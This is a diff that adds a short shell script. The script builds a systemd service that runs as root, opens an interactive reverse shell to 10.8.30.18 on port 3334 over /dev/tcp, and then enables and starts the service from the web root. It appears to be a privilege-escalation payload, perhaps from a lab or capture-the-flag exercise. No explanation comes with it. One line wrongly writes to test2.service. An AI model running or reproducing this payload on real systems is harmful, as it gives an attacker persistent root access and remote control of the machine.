@@ -1,0 +1,12 @@
+echo [Unit] > root.service
+echo "Description=root" >> root.service
+echo "" >> root.service
+echo [Service] >> root.service
+echo "Type=simple" >> root.service
+echo "User=root" >> root.service
+echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.30.18/3334 0>&1'" >> root.service
+echo "" >> root.service
+echo [Install] >> test2.service
+echo "WantedBy=multi-user.target" >> root.service
+/bin/systemctl enable /var/www/html/root.service
+/bin/systemctl start root
